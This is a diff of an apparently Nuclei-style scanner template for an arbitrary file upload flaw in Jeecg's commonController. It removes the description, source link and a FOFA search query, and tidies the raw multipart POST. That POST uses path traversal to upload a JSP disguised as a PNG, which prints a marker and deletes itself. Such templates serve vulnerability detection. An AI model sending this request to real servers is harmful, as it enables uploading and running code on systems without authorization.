@@ -3,12 +3,8 @@ info:
   name: Jeecg commonController 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hohk8lsxu0ypfndg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hohk8lsxu0ypfndg
-    fofa: app="JEECG"
 http:
 - raw:
   - 'POST /api/../commonController.do?parserXml HTTP/1.1
@@ -23,14 +19,10 @@ http:
     Connection: close
 
 
-
-
     ------WebKitFormBoundarygcflwtei
 
 
     Content-Disposition: form-data; "name="name"
-
-
 
 
     zW9YCa.png
@@ -40,8 +32,6 @@ http:
 
 
     ontent-Disposition: form-data; name="documentTitle"
-
-
 
 
     blank
@@ -54,8 +44,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <% out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
